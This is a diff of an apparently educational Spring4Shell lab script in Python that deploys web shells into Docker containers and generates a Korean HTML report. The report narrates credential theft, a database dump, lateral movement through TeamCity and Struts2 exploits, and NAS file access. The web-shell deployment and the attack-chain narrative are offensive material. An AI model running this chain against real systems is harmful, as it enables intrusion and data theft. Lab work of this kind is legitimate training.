@@ -88,7 +88,7 @@ def check_shell(url):
         return f"[FAIL] {e}"
 
 
-def detect_spring_container(default="cvepratice-spring-1"):
+def detect_spring_container(default="01testserver-spring-1"):
     try:
         out = subprocess.check_output(["docker", "ps", "--format", "{{.Names}}"], text=True)
         for line in out.strip().split("\n"):
@@ -229,7 +229,7 @@ def main():
         container = detect_spring_container()
         info(f"    Detected container: {container}")
 
-        src  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "health_check.jsp")
+        src  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts", "health_check.jsp")
         dest = f"{container}:/usr/local/tomcat/webapps/ROOT/health_check.jsp"
         cmd  = ["docker", "cp", src, dest]
 
@@ -240,7 +240,7 @@ def main():
             deploy_ok = True
         except subprocess.CalledProcessError:
             fail("[B] docker cp failed. Check if container is running.")
-            info("    Manual: docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/")
+            info(f"    Manual: docker cp health_check.jsp {container}:/usr/local/tomcat/webapps/ROOT/")
 
     results["step4"] = deploy_ok
 
@@ -505,100 +505,95 @@ try {
     <html lang="ko">
     <head>
         <meta charset="UTF-8">
-        <title>Spring4Shell 모의해킹 실습 결과 보고서</title>
+        <title>Spring4Shell 모의해킹 최종 결과 보고서</title>
         <style>
-            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }}
-            .container {{ max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }}
-            h1 {{ color: #e74c3c; text-align: center; border-bottom: 2px solid #eee; padding-bottom: 10px; }}
-            h2 {{ color: #2c3e50; margin-top: 30px; }}
-            .summary {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin-bottom: 30px; }}
-            .step {{ margin-bottom: 20px; padding: 15px; border-left: 5px solid #bdc3c7; background: #fafafa; }}
-            .step.success {{ border-left-color: #2ecc71; }}
-            .step.fail {{ border-left-color: #e74c3c; }}
-            .badge-success {{ background: #2ecc71; color: white; padding: 3px 8px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
-            .badge-fail {{ background: #e74c3c; color: white; padding: 3px 8px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
-            pre {{ background: #2d2d2d; color: #f8f8f2; padding: 10px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; margin-top: 5px; }}
+            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: #e6e6e6; margin: 0; padding: 20px; }}
+            .container {{ max-width: 950px; margin: auto; background: #16213e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #0f3460; }}
+            h1 {{ color: #e94560; text-align: center; border-bottom: 2px solid #0f3460; padding-bottom: 10px; }}
+            h2 {{ color: #438a5e; margin-top: 30px; border-bottom: 1px dashed #0f3460; padding-bottom: 5px; }}
+            .summary {{ background: #0f3460; padding: 15px; border-radius: 5px; margin-bottom: 30px; box-shadow: inset 0 0 10px rgba(0,0,0,0.3); }}
+            .step {{ margin-bottom: 20px; padding: 15px; border-left: 5px solid #bdc3c7; background: #1a1a2e; }}
+            .step.success {{ border-left-color: #e94560; border-top: 1px solid rgba(233, 69, 96, 0.2); border-right: 1px solid rgba(233, 69, 96, 0.2); border-bottom: 1px solid rgba(233, 69, 96, 0.2); }}
+            .step.fail {{ border-left-color: #555; }}
+            .badge-success {{ background: #e94560; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
+            .badge-fail {{ background: #555; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
+            pre {{ background: #111; color: #0f0; padding: 12px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; margin-top: 5px; border: 1px solid #333; }}
             .footer {{ text-align: center; margin-top: 40px; color: #7f8c8d; font-size: 0.9em; }}
-            .desc {{ color: #555; line-height: 1.5; margin-bottom: 15px; }}
-            .res-box {{ background-color: #f9f9f9; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; }}
+            .desc {{ color: #ccc; line-height: 1.6; margin-bottom: 15px; font-size: 1.05em; }}
+            .res-box {{ background-color: rgba(0,0,0,0.3); padding: 15px; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }}
+            .cred-highlight {{ color: #f39c12; font-weight: bold; }}
+            ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 10px; }}
+            ul.creds li {{ background: #0b1a2e; margin-bottom: 5px; padding: 8px; border-left: 3px solid #f39c12; font-family: monospace; }}
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🛡️ Spring4Shell (CVE-2022-22965) 실습 보고서 <br><span style="font-size: 0.6em; color: #7f8c8d;">({current_time})</span></h1>
+            <h1>🛡️ Spring4Shell 제로데이 연계 공격 결과 보고서 <br><span style="font-size: 0.5em; color: #7f8c8d;">({current_time})</span></h1>
             
             <div class="summary">
-                <h2>실습 개요</h2>
+                <h2 style="color:#fff; margin-top:0;">실습 개요</h2>
                 <p class="desc">
-                    본 보고서는 <strong>Spring4Shell 취약점(CVE-2022-22965)</strong>을 이용한 원격 코드 실행(Remote Code Execution) 실습 과정을 시간 순서대로 기록한 안내서입니다.<br>
-                    공격이 어떻게 진행되고, 어떤 결과물을 얻어 서버 권한을 장악하는지 초보자도 쉽게 이해할 수 있도록 상세히 설명합니다.
+                    본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong>을 거점으로, 
+                    TeamCity(CVE-2024-27198)와 Struts2(CVE-2023-50164)로 횡적 이동을 연계 수행하고 
+                    사내망 기밀 NAS 데이터를 탈취하는 APT 모의해킹 통합 시나리오 결과를 기록합니다.
                 </p>
-                <p><strong>실행 일시:</strong> {current_time}</p>
-                <p><strong>공격 대상(타겟) 서버 주소:</strong> <a href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
-                <p><strong>최종 실습 결과:</strong> {'<span class="badge-success">전체 성공</span>' if all_pass else '<span class="badge-fail">부분 실패</span>'}</p>
-                <p><strong>생성된 최종 웹쉘 주소:</strong> <a href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
+                <p><strong>공격 대상 서버 주소:</strong> <a style="color:#e94560;" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
+                <p><strong>거점 웹쉘 주소:</strong> <a style="color:#438a5e;" href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
+                <p><strong>최종 실습 판정:</strong> {'<span class="badge-success">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
             </div>
 
-            <h2>단계별 상세 실행 기록</h2>
+            <h2 style="color:#fff;">단계별 해킹 수행 상세 내역</h2>
     """
 
     step_descriptions = {
-        "step1": "Spring Framework의 보안 취약점을 이용해, 서버(Tomcat)의 로그 기록 방식을 조작하는 악성 페이로드(공격 데이터)를 타겟 서버에 전송합니다.<br>이 설정이 적용되면 서버는 향후 발생하는 에러 로그를 <code>yaho4.jsp</code>라는 웹쉘 파일 형태로 저장하게 됩니다.",
-        "step2": "앞서 메모리 상에 조작해둔 로그 설정이 물리적인 파일(디스크)로 저장되도록 유도하기 위해 서버에 평범한 형태의 접속 요청을 보냅니다.<br>이 과정이 끝나면 1단계 기초 웹쉘 파일이 타겟 서버 내부에 생성됩니다.",
-        "step3": "저장된 1단계 웹쉘(<code>yaho4.jsp</code>)을 통해 타겟 서버 내부에 <code>whoami</code> (현재 접속중인 시스템 사용자 확인) 명령을 전송해 봅니다.<br>명령어에 대한 올바른 응답(root 등)이 반환된다면 취약점 공격이 성공적으로 작동하여 서버 명령 제어권을 획득한 것입니다.",
-        "step4": "1단계 웹쉘은 1줄짜리 제한적인 코드이므로, 보다 강력하고 사용하기 편리한 2단계 완성형 웹쉘(<code>health_check.jsp</code>) 파일을 추가로 업로드합니다.<br>이 스크립트는 Docker 내부 네트워크를 통해 다운로드 방식(curl) 또는 도커 내 파일 복사 방식(docker cp)을 사용해 안전하게 배포됩니다.",
-        "step5": "성공적으로 업로드된 2단계 완성형 웹쉘에 접근하여 <code>id</code> (사용자 시스템 권한 상세 조회) 명령을 전송합니다.<br>최종적으로 깔끔한 UI 화면과 함께 서버 응답이 확인되었다면, 시스템 권한 장악 실습이 완벽하게 끝났음을 의미합니다.",
-        "step6": "<strong>[1단계 - DB 접속 프로그램 유무 확인 및 2단계 - 설정 파일 탐색]</strong><br>웹쉘(RCE)을 이용해 <code>which mysql</code> 명령을 비롯하여 서버 환경 변수 및 설정 파일(<code>application.properties</code>)을 동적으로 찾아 <strong>내부 데이터베이스 접속 계정 정보</strong>를 획득합니다.",
-        "step7": "<span style='color: #e74c3c;'><strong>⚠️ [보안 테스트: DB 데이터 유출 시뮬레이션 (강사님 조언 기반)]</strong></span><br><strong>[3단계 - DB에 직접 접속 시도]</strong>단순히 정보를 읽는 것을 넘어서, <strong>획득한 RCE 권한을 이용해 내부 망의 DB에 직접 통신하여 실제 데이터를 탈취하는 시나리오</strong>입니다.<br>공격자는 RCE를 활용해 <code>mysql</code> 클라이언트를 호출하거나 소형 커스텀 쿼리 스크립트(JSP)를 즉석에서 삽입하고, 앞서 찾은 접속 정보를 이용해 회원 정보 등을 고스란히 빼갈 수 있습니다.",
-        "step8": "<strong>[내부망 횡적 이동: TeamCity & Struts2 해킹]</strong><br>Spring 서버 거점을 활용해 내부망의 TeamCity 서버의 취약점(CVE-2024-27198)을 공격하여 관리자 권한을 탈취하고, 연이어 Struts2 서버(CVE-2023-50164)에 침투하여 <strong>임직원 사내 DB 정보</strong>를 원격으로 빼냅니다.",
-        "step9": "<strong>[심층 데이터 탈취: 익명 NAS 파일 접근]</strong><br>RCE를 이용해 내부망 <code>SMB</code> 통신용 자바 라이브러리(JCIFS)를 동적으로 다운로드시킨 뒤, 사내망 스토리지(NAS) 네트워크에 몰래 마운트하여 <strong>기밀 신제품 설계도 파일(PDF 등) 목록</strong>을 Dump하는 고도화 기법입니다."
+        "step1": "Payload Transmission: Spring Framework의 Data Binding 취약점을 이용해 Tomcat 로그 기록 속성을 외부에서 변조하는 패킷을 전송했습니다.",
+        "step2": "Tomcat Log Flush: 물리 디스크에 yaho4.jsp 웹쉘이 생성되도록 유도 트래픽을 보냈습니다.",
+        "step3": "1단계 웹쉘(Stager) 접속 상태를 점검하여, 타겟 서버의 코드 실행(RCE) 권한 획득 여부를 검증했습니다.",
+        "step4": "기본 웹쉘을 거점 삼아, 향후 횡적 이동의 중추가 될 완성형 Stage2 웹쉘(health_check.jsp)을 내부 배포했습니다.",
+        "step5": "디버깅과 원활한 RCE 로직을 탑재한 완성형 웹쉘의 동작 무결성을 점검했습니다.",
+        "step6": "<strong>Info Leakage (크리덴셜 추출)</strong>: RCE를 활용하여 타겟 환경 내부에 저장된 DB URL 및 계정 정보를 탐색해 성공적으로 탈취했습니다.",
+        "step7": "<strong>Threat Demonstration (내부망 DB 타격)</strong>: 탈취한 계정을 재사용, 해커가 내부망의 Spring DB에 직접 접근시켜 고객용 테이블을 그대로 덤프했습니다.",
+        "step8": "<strong>Lateral Movement (Struts & TeamCity)</strong>: Spring 거점에서 최신 TeamCity 익스플로잇으로 관리자 권한을 강탈한 뒤, Struts2 파일 업로드 취약점을 연쇄 발동시켜 핵심 임직원 데이터베이스를 탈취했습니다.",
+        "step9": "<strong>Advanced Post-Exploitation (NAS SMB)</strong>: JCIFS-NG 어댑터를 동률적으로 구성, 인트라넷 내부에 분리된 사내 연구용 NAS 스토리지의 파일 맵을 열람했습니다."
     }
 
     for key, label in labels.items():
         passed = results.get(key, False)
         status_class = "success" if passed else "fail"
         badge = '<span class="badge-success">성공</span>' if passed else '<span class="badge-fail">실패</span>'
-        
         desc = step_descriptions.get(key, "")
-        
         detail = ""
-        if key == "step3" and passed:
-            detail = f"<div class='res-box'><strong>[원격 실행 결과: whoami]</strong><pre>{check_shell(f'{STAGER_URL}?cmd=whoami')}</pre></div>"
-        elif key == "step5" and passed:
-            detail = f"<div class='res-box'><strong>[원격 실행 결과: id]</strong><pre>{check_shell(STAGE2_URL)}</pre></div>"
-        elif key == "step6" and passed:
-            detail = f"""<div class='res-box' style='border: 1px solid #e67e22; background-color: #fdf6e3;'>
-                <p style="color: #d35400; margin-top: 0; margin-bottom: 5px;"><strong>[DB 설정 정보 탐색 및 탈취 성공]</strong></p>
-                <p style="margin-top: 5px; margin-bottom: 5px; font-size: 0.9em;">- MySQL 클라이언트 존재 여부 확인 및 application.properties 동적 검색 완료</p>
-                <ul style="margin-top: 5px; margin-bottom: 0;">
-                    <li><strong>URL:</strong> {db_credentials.get('url')}</li>
-                    <li><strong>USER:</strong> {db_credentials.get('user')}</li>
-                    <li><strong>PASSWORD:</strong> {db_credentials.get('pass')}</li>
+        
+        if key == "step6" and passed:
+            detail = f"""<div class='res-box'>
+                <p style="color: #f39c12; margin-top: 0; font-size: 1.1em; font-weight: bold;">[탈취된 중요 자산: 데이터베이스 접속 정보]</p>
+                <ul class="creds">
+                    <li>URL : <span style="color:#e94560;">{db_credentials.get('url')}</span></li>
+                    <li>USER : <span style="color:#e94560;">{db_credentials.get('user')}</span></li>
+                    <li>PASS : <span style="color:#e94560;">{db_credentials.get('pass')}</span></li>
                 </ul>
             </div>"""
         elif key == "step7" and passed:
-            detail = f"""<div class='res-box' style='border: 1px solid #e74c3c; background-color: #fff0f0;'>
-                <p style="color: #c0392b; margin-top: 0; margin-bottom: 10px; font-size: 1.1em;"><strong>🚨 실제 내부 DB 데이터 공격 (RCE 활용 증명)</strong></p>
-                <p style="margin-bottom: 5px; color: #333;"><strong>실제 구조 파악 및 일부 데이터 추출 (SHOW TABLES & SELECT)</strong><br>
-                <span style="font-size: 0.9em; color: #555;">- 작동 방식: <strong>{run_mode}</strong><br>- RCE를 이용해 내부망(spring-db)에 쿼리를 전송하여 뽑아낸 실제 구조와 데이터입니다.</span></p>
-                <pre style='max-height: 300px; border-left: 4px solid #c0392b;'>{db_dump_result}</pre>
+            detail = f"""<div class='res-box'>
+                <p style="color: #3498db; margin-top: 0; font-size: 1.1em; font-weight: bold;">[덤프 완료: 타겟 서비스 고객 테이블]</p>
+                <pre>{db_dump_result}</pre>
             </div>"""
         elif key == "step8" and passed:
-            detail = f"""<div class='res-box' style='border: 1px solid #8e44ad; background-color: #f5eef8;'>
-                <p style="color: #8e44ad; margin-top: 0; margin-bottom: 5px;"><strong>[내부망 임직원 DB 탈취 성공]</strong></p>
-                <pre style='max-height: 300px; border-left: 4px solid #8e44ad;'>{step8_result}</pre>
+            detail = f"""<div class='res-box'>
+                <p style="color: #9b59b6; margin-top: 0; font-size: 1.1em; font-weight: bold;">[연쇄 타격: Struts2 임직원 내부망 데이터 탈취]</p>
+                <pre>{step8_result}</pre>
             </div>"""
         elif key == "step9" and passed:
-            detail = f"""<div class='res-box' style='border: 1px solid #2980b9; background-color: #ebf5fb;'>
-                <p style="color: #2980b9; margin-top: 0; margin-bottom: 5px;"><strong>[사내망 NAS 기밀 도면 탈취 성공]</strong></p>
-                <pre style='max-height: 300px; border-left: 4px solid #2980b9;'>{step9_result}</pre>
+            detail = f"""<div class='res-box'>
+                <p style="color: #1abc9c; margin-top: 0; font-size: 1.1em; font-weight: bold;">[최종 임팩트: 폐쇄망 NAS 파일 시스템 뷰]</p>
+                <pre>{step9_result}</pre>
             </div>"""
-        elif not passed and key in ["step3", "step4", "step5", "step6", "step7", "step8", "step9"]:
-            detail = f"<div class='res-box' style='border-color: #e74c3c; color: #e74c3c;'><strong>[오류 안내]</strong> 해당 단계 수행 중 문제가 발생했습니다.</div>"
+        elif not passed and key in ["step6", "step7", "step8", "step9"]:
+             detail = f"<div class='res-box' style='border-color: #e74c3c;'>해당 공격 프로세스가 차단되거나 실패했습니다.</div>"
 
         html_content += f"""
             <div class="step {status_class}">
-                <h3>{badge} {label}</h3>
+                <h3 style="color:#fff;">{badge} {label}</h3>
                 <p class="desc">{desc}</p>
                 {detail}
             </div>
@@ -606,8 +601,8 @@ try {
 
     html_content += """
             <div class="footer">
-                <p>본 실습 결과 보고서는 모의해킹 교육 목적으로 <strong>run.py</strong> 스크립트에 의해 자동 생성되었습니다.<br> 
-                모든 권한 없는 시스템 침투는 엄격히 금지됩니다.</p>
+                <p>본 실습 결과 보고서는 APT 침투 교육 목적으로 <strong>run.py</strong> 체이닝 스크립트에 의해 자동 생성되었습니다.<br> 
+                모의해킹 실습 코드를 외부 시스템에 임의 사용하는 것은 금지됩니다.</p>
             </div>
         </div>
     </body>
